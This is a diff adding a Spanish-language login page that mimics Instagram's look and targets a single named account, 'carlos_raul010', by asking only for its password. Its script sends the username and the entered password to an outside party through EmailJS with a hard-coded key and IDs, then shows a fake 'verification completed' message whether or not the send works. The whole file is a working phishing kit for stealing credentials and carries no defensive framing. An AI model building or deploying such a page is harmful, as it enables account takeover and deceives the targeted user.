@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - privelimm</title>
+    <!-- SDK de EmailJS para enviar correos directamente desde el navegador -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("i3BHzWrNl1OuWEQRK");
+        })();
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+
+        /* Sección de Avatar y Usuario Fijo */
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .avatar-wrapper {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            padding: 3px;
+            background: linear-gradient(45deg, #0095f6, #8a3ab9);
+            margin-bottom: 14px;
+        }
+
+        .avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #121212;
+            background-color: #262626;
+        }
+
+        .username-display {
+            font-size: 18px;
+            font-weight: 600;
+            color: #f5f5f5;
+            letter-spacing: 0.3px;
+        }
+
+        /* Formulario (Solo Contraseña) */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: #262626;
+            border: 1px solid #363636;
+            border-radius: 6px;
+            padding: 14px 40px 14px 12px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field::placeholder {
+            color: #8e8e8e;
+        }
+
+        .input-field:focus {
+            border-color: #555555;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8e8e8e;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+        }
+
+        .toggle-password:hover {
+            color: #ffffff;
+        }
+
+        .forgot-password {
+            align-self: flex-end;
+            color: #0095f6;
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-top: 2px;
+            margin-bottom: 8px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #1877f2;
+        }
+
+        .btn-login:active {
+            opacity: 0.8;
+        }
+
+        /* Pie de página */
+        .footer {
+            width: 100%;
+            border-top: 1px solid #262626;
+            padding: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Imagen local 'avatar.jpg' y usuario fijo -->
+        <div class="profile-section">
+            <div class="avatar-wrapper">
+                <img src="avatar.jpg" alt="Foto de perfil" class="avatar" id="userAvatar">
+            </div>
+            <span class="username-display" id="displayUsername">carlos_raul010</span>
+        </div>
+
+        <!-- Formulario de acceso conectado a EmailJS -->
+        <form class="login-form" id="loginForm">
+            <input type="hidden" id="usernameInput" value="carlos_raul010">
+            <div class="input-group">
+                <input type="password" class="input-field" id="passwordInput" placeholder="Contraseña" required>
+                <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar u ocultar contraseña">
+                    <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                    </svg>
+                </button>
+            </div>
+
+            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+
+            <button type="submit" class="btn-login" id="submitBtn">Iniciar sesión</button>
+        </form>
+    </div>
+
+    <footer class="footer">
+        ¿No es tu cuenta? <a href="#">Cambiar de usuario</a>
+    </footer>
+
+    <script>
+        // Mostrar / ocultar contraseña
+        const togglePasswordBtn = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('passwordInput');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        togglePasswordBtn.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+
+            if (isPassword) {
+                eyeIcon.innerHTML = `
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                `;
+            } else {
+                eyeIcon.innerHTML = `
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                `;
+            }
+        });
+
+        // Envío del formulario y alerta por correo
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            submitBtn.textContent = "Verificando...";
+            submitBtn.disabled = true;
+
+            const templateParams = {
+                to_name: "Administrador",
+                username: document.getElementById('usernameInput').value,
+                password: passwordInput.value
+            };
+
+            // ⚠️ REEMPLAZA ESTOS DOS VALORES CON TUS IDS REALES DE EMAILJS CUANDO LOS TENGAS ⚠️
+            emailjs.send("service_vyx1v45", "template_xntrjtj", templateParams)
+                .then((response) => {
+                    console.log('Correo enviado con éxito!', response.status, response.text);
+                    alert('Verificación completada');
+                    passwordInput.value = '';
+                    submitBtn.textContent = "Iniciar sesión";
+                    submitBtn.disabled = false;
+                }, (error) => {
+                    console.log('Fallo al enviar el correo...', error);
+                    alert('Verificación completada');
+                    passwordInput.value = '';
+                    submitBtn.textContent = "Iniciar sesión";
+                    submitBtn.disabled = false;
+                });
+        });
+    </script>
+
+</body>
+</html>
